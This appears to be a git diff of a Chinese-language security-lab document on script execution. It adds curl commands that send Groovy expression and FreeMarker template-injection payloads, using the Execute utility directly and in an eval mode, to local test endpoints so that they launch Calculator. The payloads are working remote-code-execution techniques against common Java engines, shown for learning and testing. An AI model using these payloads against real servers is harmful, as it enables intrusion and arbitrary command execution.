@@ -1,5 +1,11 @@
 ### 脚本执行
 
+#### groovy
+
+```
+curl 127.0.0.1:8080/groovy/parse -d 'expression="open /System/Applications/Calculator.app".execute()'
+```
+
 #### ognl
 
 ```
@@ -64,6 +70,14 @@ JythonRuntime需要本地有class: https://tttang.com/archive/1412/
 curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open /System/Applications/Calculator.app")</@value>'
 
 curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.Execute"?new()>$${value("open /System/Applications/Calculator.app")}'
+
+curl 127.0.0.1:8080/freemarker/unsafe -d 'template=${"freemarker.template.utility.Execute"?new()("open /System/Applications/Calculator.app")}'
+```
+
+eval模式
+
+```
+curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.Execute"?new()("open /System/Applications/Calculator.app")'
 ```
 
 #### thymeleaf模板注入
